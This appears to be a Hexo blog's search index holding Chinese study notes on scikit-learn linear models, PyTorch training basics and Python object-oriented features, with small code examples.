<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python/sklearn</title>
      <link href="python/sklearn/"/>
      <url>python/sklearn/</url>
      
        <content type="html"><![CDATA[<h1 id="sk-learn"><a href="#sk-learn" class="headerlink" title="sk-learn"></a>sk-learn</h1><a id="more"></a><p>简介 </p><p>scikit-learn是基于Python 语言的机器学习工具</p><ul><li>简单高效的数据挖掘和数据分析工具</li><li>可供大家在各种环境中重复使用</li><li>建立在 NumPy ，SciPy 和 matplotlib 上</li><li>开源，可商业使用 - BSD许可证</li></ul><h2 id="监督学习"><a href="#监督学习" class="headerlink" title="监督学习"></a>监督学习</h2><p>fit方法可以用来完成线性模型中的拟合，coef_成员一般用来存储模型系数 </p><h3 id="广义线性模型"><a href="#广义线性模型" class="headerlink" title="广义线性模型"></a>广义线性模型</h3><p>本章主要讲述一些用于回归的方法，其中目标值 y 是输入变量 x 的线性组合。 数学概念表示为：如果 <img src="../images/sklearn/047826f1c2e6f2687b304cb5217be8d8.jpg" alt="\hat{y}"> 是预测值，那么有：</p><p><img src="../images/sklearn/4ee9f6c666393981b6458e54c3ec89d0.jpg" alt="\hat{y}(w, x) = w_0 + w_1 x_1 + ... + w_p x_p"></p><p>在整个模块中，我们定义向量 <img src="../images/sklearn/b003858334d1ad594207911e84219151.jpg" alt="w = (w_1,..., w_p)"> 作为 <code>coef_</code> ，定义 <img src="../images/sklearn/57e15e43b846791e47a202e1a9a5d8ce.jpg" alt="w_0"> 作为 <code>intercept_</code> 。</p><h4 id="普通最小二乘法"><a href="#普通最小二乘法" class="headerlink" title="普通最小二乘法"></a>普通最小二乘法</h4><p>LinearRegression 拟合一个带有系数 w = （w1,……,wp）的线性模型</p><p>使得实际观测数据和预测数据（估计值）之间的残差平方和最小</p><p><img src="../images/sklearn/1b6228a71a038f66ac7b8a2743adf4e7.jpg" alt="\underset{w}{min\,} {|| X w - y||_2}^2"></p><p>数学表达式 min(w)||Xw-y||2²</p><p>LinearRegression 会调用fit方法来你和数组X，y，并且将线性模型的系数w存储在其成员变量</p><p>coef_中：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="keyword">from</span> sklearn <span class="keyword">import</span> linear_model</span><br><span class="line">&gt;&gt;&gt; reg = linear_model.LinearRegression()</span><br><span class="line">&gt;&gt;&gt; reg.fit ([[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">1</span>], [<span class="number">2</span>, <span class="number">2</span>]], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line">LinearRegression(copy_X=True, fit_intercept=True, n_jobs=<span class="number">1</span>, normalize=False)</span><br><span class="line">&gt;&gt;&gt; reg.coef_</span><br><span class="line"><span class="built_in">array</span>([ <span class="number">0.5</span>,  <span class="number">0.5</span>])</span><br></pre></td></tr></table></figure><p>特性导致最小二乘估计对于随机误差非常敏感，可能产生很大的方差，在没有实验设计的情况下收集到的数据，这种多重共线性(mylticollinearity)的情况可能真的会出现 </p><h4 id="普通最小二乘法的复杂度"><a href="#普通最小二乘法的复杂度" class="headerlink" title="普通最小二乘法的复杂度"></a>普通最小二乘法的复杂度</h4><p>如果 X 是一个形状为 <code>(n_samples, n_features)</code>的矩阵，设$$n_{samples} \geq n_{features}$$, 则该方法的复杂度为$$O(n_{samples} n_{fearures}^2)$$</p><h3 id="线性和二次判别分析"><a href="#线性和二次判别分析" class="headerlink" title="线性和二次判别分析"></a>线性和二次判别分析</h3><p>该方法使用 X 的奇异值分解来计算最小二乘解。如果 X 是一个形状为 <code>(n_samples, n_features)</code>的矩阵，设 n_{samples} \geq n_{features}<em>n<strong>s</strong>a<strong>m</strong>p<strong>l</strong>e<strong>s<em>≥</em>n</strong>f<strong>e</strong>a<strong>t</strong>u<strong>r</strong>e**s</em> , 则该方法的复杂度为 O(n_{samples} n_{fearures}^2)<em>O</em>(<em>n*</em>s<strong>a</strong>m<strong>p</strong>l<strong>e</strong>s<strong>n</strong>f<strong>e</strong>a<strong>r</strong>u<strong>r</strong>e*<em>s</em>2)</p><h3 id="内核岭回归"><a href="#内核岭回归" class="headerlink" title="内核岭回归"></a>内核岭回归</h3><p><a href="https://scikit-learn.org/stable/modules/generated/sklearn.linear_model.Ridge.html#sklearn.linear_model.Ridge" target="_blank" rel="noopener"><code>Ridge</code></a> 回归通过对系数的大小施加惩罚来解决 <a href="https://sklearn.apachecn.org/docs/master/2.html#1111-普通最小二乘法复杂度" target="_blank" rel="noopener">普通最小二乘法</a> 的一些问题。 岭系数最小化的是带罚项的残差平方和，</p><p>)<img src="../images/sklearn/image-20201113215106217.png" alt="image-20201113215106217">)其中，<img src="../images/sklearn/image-20201113215127267.png" alt="image-20201113215127267">控制系数收缩量的复杂性参数： 的值越大，收缩量越大，模型对共线性的鲁棒性也更强。</p><h3 id="支持向量机"><a href="#支持向量机" class="headerlink" title="支持向量机"></a>支持向量机</h3><h2 id="无监督学习"><a href="#无监督学习" class="headerlink" title="无监督学习"></a>无监督学习</h2><h2 id="模型选择和评估"><a href="#模型选择和评估" class="headerlink" title="模型选择和评估"></a>模型选择和评估</h2><h2 id="数据集转换"><a href="#数据集转换" class="headerlink" title="数据集转换"></a>数据集转换</h2><h2 id="数据集加载工具"><a href="#数据集加载工具" class="headerlink" title="数据集加载工具"></a>数据集加载工具</h2><h2 id="使用scikit-learn计算"><a href="#使用scikit-learn计算" class="headerlink" title="使用scikit-learn计算"></a>使用scikit-learn计算</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/pytorch</title>
      <link href="python/pytorch/"/>
      <url>python/pytorch/</url>
      
        <content type="html"><![CDATA[<h1 id="pytorch学习"><a href="#pytorch学习" class="headerlink" title="pytorch学习"></a>pytorch学习</h1><a id="more"></a><p>包torch包含了多维张量的数据结构以及基于其上的多种数学操作。另外，它也提供了多种工具，其中一些可以更有效地对张量和任意类型进行序列化</p><h2 id="图片数据建模流程范例"><a href="#图片数据建模流程范例" class="headerlink" title="图片数据建模流程范例"></a>图片数据建模流程范例</h2><h3 id="1，准备数据"><a href="#1，准备数据" class="headerlink" title="1，准备数据"></a>1，准备数据</h3><p>cifar2数据集只包括前两种cifar10数据集类别airplane和automobile</p><p>在Pytorch中构建图片数据管道通常有三种方法。</p><p>第一种是使用 torchvision中的datasets.ImageFolder来读取图片然后用 DataLoader来并行加载。</p><p>第二种是通过继承 torch.utils.data.Dataset 实现用户自定义读取逻辑然后用 DataLoader来并行加载。</p><p>第三种方法是读取用户自定义数据集的通用方法，既可以读取图片数据集，也可以读取文本数据集。</p><h2 id="基础流畅和操作"><a href="#基础流畅和操作" class="headerlink" title="基础流畅和操作"></a>基础流畅和操作</h2><h3 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h3><p><strong>作用</strong> ：通过激活函数，网络结构学到了非线性特征，而不使用激活函数，只能得到学到线性特征。</p><p>其中torch 包中</p><p>各个<a href="https://blog.csdn.net/dss_dssssd/article/details/83927312" target="_blank" rel="noopener">激活函数的讲解</a></p><h3 id="Autograd（自动求导机制）"><a href="#Autograd（自动求导机制）" class="headerlink" title="Autograd（自动求导机制）"></a>Autograd（自动求导机制）</h3><p><code>torch.Tensor</code>是这个包的核心类。如果设置 <code>.requires_grad</code> 为 <code>True</code>，那么将会追踪所有对于该张量的操作。 当完成计算后通过调用 <code>.backward()</code>，自动计算所有的梯度， 这个张量的所有梯度将会自动积累到 <code>.grad</code> 属性。</p><p>张量的request_grad属性值没有指定的话，会默认为false</p><h3 id="optimizer-优化器"><a href="#optimizer-优化器" class="headerlink" title="optimizer 优化器"></a>optimizer 优化器</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loss.backward()  <span class="comment">#反向梯度</span></span><br><span class="line">optimizer_G.step() 进行参数更新值的传递 更新optimizer中作用对象parameters</span><br><span class="line"><span class="attr">optimizer</span> = torch.optim.SGD(net.parameters(), <span class="attr">lr=0.2)</span>  <span class="comment"># 传入net的所有参数，学习率</span></span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optimizer.zero_grad() #梯度置<span class="number">0</span>，吧loss关于weight的导数变为<span class="number">0</span></span><br></pre></td></tr></table></figure><p>使用optimizer时每个batch 一般有的操作</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># zero the parameter gradients</span></span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        <span class="comment"># forward + backward + optimize</span></span><br><span class="line">        <span class="attr">outputs</span> = net(inputs)</span><br><span class="line">        <span class="attr">loss</span> = criterion(outputs, labels)</span><br><span class="line">        loss.backward()</span><br><span class="line">optimizer.step()</span><br></pre></td></tr></table></figure><p>可以参考理解成为一种梯度下降法</p><h4 id="lr"><a href="#lr" class="headerlink" title="lr"></a>lr</h4><p><a href="https://blog.csdn.net/qq_37764129/article/details/101522154?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf" target="_blank" rel="noopener">参考</a></p><p>lr即stride（步长），即反向传播算法中的η <img src="../images/pytorch/2019092711442454.png" alt="img"></p><p>学习率的大小</p><table><thead><tr><th></th><th>学习率 大</th><th>学习率 小</th></tr></thead><tbody><tr><td>学习速度</td><td>快</td><td>慢</td></tr><tr><td>使用时间点</td><td>刚开始训练时</td><td>一定轮数过后</td></tr><tr><td>副作用</td><td>1.易损失值爆炸；2.易振荡。</td><td>1.易过拟合；2.收敛速度慢。</td></tr></tbody></table><p>在训练过程中，一般根据训练轮数设置动态变化的学习率。</p><p>刚开始训练时：学习率以 0.01 ~ 0.001 为宜。<br>一定轮数过后：逐渐减缓。<br>接近训练结束：学习速率的衰减应该在100倍以上。</p><p><strong>Note：</strong><br>如果是 <strong>迁移学习</strong> ，由于模型已在原始数据上收敛，此时应设置较小学习率 (≤10−4≤10−4) 在新数据上进行 <strong>微调</strong> 。</p><h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><h4 id="MSELoss"><a href="#MSELoss" class="headerlink" title="MSELoss()"></a>MSELoss()</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">loss_func</span> = torch.nn.MSELoss()   <span class="comment">#建立损失函数对象</span></span><br><span class="line"><span class="attr">loss</span> = loss_func(prediction, y)  <span class="comment">#计算两个数据集的误差</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/python</title>
      <link href="python/python/"/>
      <url>python/python/</url>
      
        <content type="html"><![CDATA[<h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><a id="more"></a><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><h4 id="实例属性和类属性"><a href="#实例属性和类属性" class="headerlink" title="实例属性和类属性"></a>实例属性和类属性</h4><p>给实例绑定属性的方法是通过实例对象，或者通过self变量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name)</span>:</span></span><br><span class="line">self.name =  name</span><br><span class="line"></span><br><span class="line">s = Studen(<span class="string">"Bob"</span>)</span><br><span class="line">s.score = <span class="number">90</span> <span class="comment">#可以说对象s绑定乐score属性</span></span><br></pre></td></tr></table></figure><p>如果Student 类本书需要绑定一个属性可以直接在class中定义属性，这种属性是类属性，归Student所有</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#class Stident(obiect):</span></span><br><span class="line"><span class="comment">#name = "Student"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="class"><span class="keyword">class</span> <span class="title">Student</span>(<span class="title">object</span>):</span></span><br><span class="line">...     name =  <span class="string">"Student"</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s  = Student()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.name</span><br><span class="line"><span class="string">'Student'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.name = <span class="string">"Michael"</span> <span class="comment"># 给实例绑定name属性</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.name</span><br><span class="line"><span class="string">'Michael'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;del s.name <span class="comment">#删除实例的name属性</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;s.name</span><br><span class="line"><span class="string">'Student'</span></span><br></pre></td></tr></table></figure><h3 id="面向对象（高级）"><a href="#面向对象（高级）" class="headerlink" title="面向对象（高级）"></a>面向对象（高级）</h3><h4 id="使用”slots“"><a href="#使用”slots“" class="headerlink" title="使用”slots“"></a>使用”<strong>slots</strong>“</h4><p><strong>slots</strong>仅对当前类实例起作用，对继承的子类是不起作用的</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">Student</span>(<span class="symbol">object</span>):</span><br><span class="line"><span class="symbol">__slots__</span> = ("<span class="symbol">name</span>","<span class="symbol">age</span>") #使用<span class="symbol">tuple</span>定义允许绑定的属性名称</span><br></pre></td></tr></table></figure><h4 id="使用-property"><a href="#使用-property" class="headerlink" title="使用@property"></a>使用@property</h4><p>python内置的@porperty装饰器就是负责把一个方法变成属性调用的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">score</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._score</span><br><span class="line"></span><br><span class="line"><span class="meta">    @score.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">score</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, int):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'score must be an integer!'</span>)</span><br><span class="line">        <span class="keyword">if</span> value &lt; <span class="number">0</span> <span class="keyword">or</span> value &gt; <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">'score must between 0 ~ 100!'</span>)</span><br><span class="line">        self._score = value</span><br></pre></td></tr></table></figure><p>@property 的使用 ， 把一个getter方法变成属性，只需要加上@property就可以了，此时，@property本身又创建了另一个装饰器@score.setter ，负责把一个setter方法变成属性赋值，于是，我们就拥有了一个可控的属性操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s =  Student()</span><br><span class="line">s.score = <span class="number">60</span> <span class="comment">#OK, 实际转化为s.set_score(60)</span></span><br><span class="line">s.score <span class="comment">#OK，实际转化为s.get_score()</span></span><br><span class="line"><span class="number">60</span> </span><br><span class="line">s.score = <span class="number">9999</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">ValueError: score must between <span class="number">0</span> ~ <span class="number">100</span>!</span><br></pre></td></tr></table></figure><p>在加上@property时，对实例属性操作的时候，就知道该属性很可能不是直接暴露的，而是通过getter和setter方法来实现的，还可以定义只读属性，只定义getter方法，不定义setter方法就是一个只读属性:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">birth</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._birth</span><br><span class="line"></span><br><span class="line"><span class="meta">    @birth.setter   #可读写</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">birth</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        self._birth = value</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(self)</span>:</span>  <span class="comment">#只读</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2015</span> - self._birth</span><br></pre></td></tr></table></figure><h4 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h4><p>class A(a,b): A类继承 a，b类 </p><h4 id="定制类"><a href="#定制类" class="headerlink" title="定制类"></a>定制类</h4><p>定义并实现特殊名称的函数 ，实现相对应的</p><h4 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h4><p>python提供Enum类来实现枚举类</p><p>通常将枚举类型定义为一个class类型，然后，每个常量都是class的一个唯一实例。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum</span><br><span class="line"></span><br><span class="line">Month = Enum(<span class="string">'Month'</span>, (<span class="string">'Jan'</span>, <span class="string">'Feb'</span>, <span class="string">'Mar'</span>, <span class="string">'Apr'</span>, <span class="string">'May'</span>, <span class="string">'Jun'</span>, <span class="string">'Jul'</span>, <span class="string">'Aug'</span>, <span class="string">'Sep'</span>, <span class="string">'Oct'</span>, <span class="string">'Nov'</span>, <span class="string">'Dec'</span>))</span><br><span class="line"><span class="comment">#可以直接使用 Month.Jan来引用一个常量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name, member <span class="keyword">in</span> Month.__members__.items():</span><br><span class="line">    print(name, <span class="string">'=&gt;'</span>, member, <span class="string">','</span>, member.value) <span class="comment">#枚举它的所有成员</span></span><br><span class="line">    value属性则是自动赋给成员的int常量，默认从<span class="number">1</span>开始计数</span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt;<span class="keyword">for</span> name,member <span class="keyword">in</span> Month.__members__.items():</span><br><span class="line"><span class="meta">... </span>    print(name,<span class="string">"=&gt;"</span>,member,<span class="string">','</span>,member.value)</span><br><span class="line">...</span><br><span class="line">Jan =&gt; Month.Jan , 1</span><br><span class="line">Feb =&gt; Month.Feb , 2</span><br><span class="line">Mar =&gt; Month.Mar , 3</span><br><span class="line">Apr =&gt; Month.Apr , 4</span><br><span class="line">May =&gt; Month.May , 5</span><br><span class="line">Jun =&gt; Month.Jun , 6</span><br><span class="line">Jul =&gt; Month.Jul , 7</span><br><span class="line">Aug =&gt; Month.Aug , 8</span><br><span class="line">Sep =&gt; Month.Sep , 9</span><br><span class="line">Oct =&gt; Month.Oct , 10</span><br><span class="line">Nov =&gt; Month.Nov , 11</span><br><span class="line">Dec =&gt; Month.Dec , 12for name,member in Month.__members__.items():</span><br><span class="line"><span class="meta">... </span>    print(name,<span class="string">"=&gt;"</span>,member,<span class="string">','</span>,member.value)</span><br><span class="line">...</span><br><span class="line">Jan =&gt; Month.Jan , 1</span><br><span class="line">Feb =&gt; Month.Feb , 2</span><br><span class="line">Mar =&gt; Month.Mar , 3</span><br><span class="line">Apr =&gt; Month.Apr , 4</span><br><span class="line">May =&gt; Month.May , 5</span><br><span class="line">Jun =&gt; Month.Jun , 6</span><br><span class="line">Jul =&gt; Month.Jul , 7</span><br><span class="line">Aug =&gt; Month.Aug , 8</span><br><span class="line">Sep =&gt; Month.Sep , 9</span><br><span class="line">Oct =&gt; Month.Oct , 10</span><br><span class="line">Nov =&gt; Month.Nov , 11</span><br><span class="line">Dec =&gt; Month.Dec , 12</span><br></pre></td></tr></table></figure><p>如果需要更精确的控制枚举类型，可以从Enum派生出自定义类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum, unique</span><br><span class="line"></span><br><span class="line"><span class="meta">@unique</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Weekday</span><span class="params">(Enum)</span>:</span></span><br><span class="line">    Sun = <span class="number">0</span> <span class="comment"># Sun的value被设定为0</span></span><br><span class="line">    Mon = <span class="number">1</span></span><br><span class="line">    Tue = <span class="number">2</span></span><br><span class="line">    Wed = <span class="number">3</span></span><br><span class="line">    Thu = <span class="number">4</span></span><br><span class="line">    Fri = <span class="number">5</span></span><br><span class="line">    Sat = <span class="number">6</span></span><br><span class="line">   <span class="comment"># `@unique`装饰器可以帮助我们检查保证没有重复值</span></span><br></pre></td></tr></table></figure><h4 id="元类"><a href="#元类" class="headerlink" title="元类"></a>元类</h4><p>动态语言和静态语言最大的不同，就是函数和类的定义，不是编译时定义的，而是运行时动态创建的。</p><p>type()函数可以查看一个类型或变量的类型，我们说class的定义是运行时动态创建的，而创建class的方法就是使用type()函数</p><p>type()函数既可以返回一个对象的类型，又可以创建出新的类型，比如，我们可以同各国type()函数创建Hello类，而无需通过class Hello(object)…的定义:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span><span class="params">(<span class="keyword">self</span>,name=<span class="string">'world'</span>)</span></span>:<span class="comment">#先定义函数</span></span><br><span class="line">print(<span class="string">'hello, %s'</span> % name)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; Hello = type(<span class="string">'Hello'</span>, (object,), dict(hello=fn)) <span class="comment"># 创建Hello class</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; h = Hello()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; h.hello()</span><br><span class="line">hello, world</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;type(Hello)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">type</span>'&gt;</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; type(h)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">__main__</span>.<span class="title">Hello</span>'&gt;</span></span><br></pre></td></tr></table></figure><p>要创建一个class对象，<code>type()</code>函数依次传入3个参数：</p><ol><li>class的名称；</li><li>继承的父类集合，注意Python支持多重继承，如果只有一个父类，别忘了tuple的单元素写法；</li><li>class的方法名称与函数绑定，这里我们把函数<code>fn</code>绑定到方法名<code>hello</code>上。</li></ol><p>通过<code>type()</code>函数创建的类和直接写class是完全一样的，因为Python解释器遇到class定义时，仅仅是扫描一下class定义的语法，然后调用<code>type()</code>函数创建出class。</p><p>正常情况下，我们都用<code>class Xxx...</code>来定义类，但是，<code>type()</code>函数也允许我们动态创建出类来，也就是说，动态语言本身支持运行期动态创建类，这和静态语言有非常大的不同，要在静态语言运行期创建类，必须构造源代码字符串再调用编译器，或者借助一些工具生成字节码实现，本质上都是动态编译，会非常复杂。</p><p>metaclass,直译为元类</p><p>先定义metaclass ，就可以创建类，最后创建实例</p><p>metclass  基本不会使用</p><h3 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h3><p>python中的小括号( )：代表tuple元组数据类型，元组是一种不可变序列。</p><p>python中的中括号[ ]，代表list列表数据类型：</p><p>python大括号{ }花括号：代表<a href="https://www.baidu.com/s?wd=dic&tn=44039180_cpr&fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1Y3nhnYuWRkPj61nAfknj-W0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EPj6YrHcsnHcY" target="_blank" rel="noopener">dic</a>t字典数据类型，字典是由键对值组组成(key=&gt;value)。冒号’:’分开键和值，逗号’,’隔开组。用大括号创建的方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dic  = &#123;<span class="string">'jon'</span>:<span class="string">'boy'</span>,<span class="string">'lili'</span>:<span class="string">'girl'</span>&#125;</span><br><span class="line">dic</span><br><span class="line"></span><br><span class="line">output： &#123;<span class="string">'jon'</span>:<span class="string">'boy'</span>,<span class="string">'lili'</span>:<span class="string">'girl'</span>&#125;</span><br><span class="line">dic[<span class="string">'jon'</span>]</span><br><span class="line">output: <span class="string">'boy'</span></span><br><span class="line">dic[<span class="string">'jon'</span>] = <span class="string">'boy_girl'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dic[<span class="string">'jon'</span>]</span><br><span class="line"><span class="string">'boy_girl'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="字典-使用”-”创建"><a href="#字典-使用”-”创建" class="headerlink" title="字典(使用”{}”创建)"></a>字典(使用”{}”创建)</h4><p>删除字典元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Zara'</span>, <span class="string">'Age'</span>: <span class="number">7</span>, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125;</span><br><span class="line">dict.clear()  <span class="comment">#清空字典所有条目</span></span><br><span class="line"><span class="keyword">del</span> dict[<span class="string">'Name'</span>] <span class="comment">#删除键是'Name'的条目</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">result = &#123;&#125;</span><br><span class="line">result[<span class="string">"abc"</span>] = <span class="string">"111"</span></span><br><span class="line">result</span><br><span class="line">&#123;<span class="string">'abc'</span>: <span class="string">'111'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> dict_name:</span><br><span class="line">result[row[<span class="string">'name'</span>]] = row[<span class="string">'score'</span>]</span><br></pre></td></tr></table></figure><h3 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h3><h4 id="csv文件处理"><a href="#csv文件处理" class="headerlink" title="csv文件处理"></a>csv文件处理</h4><p><a 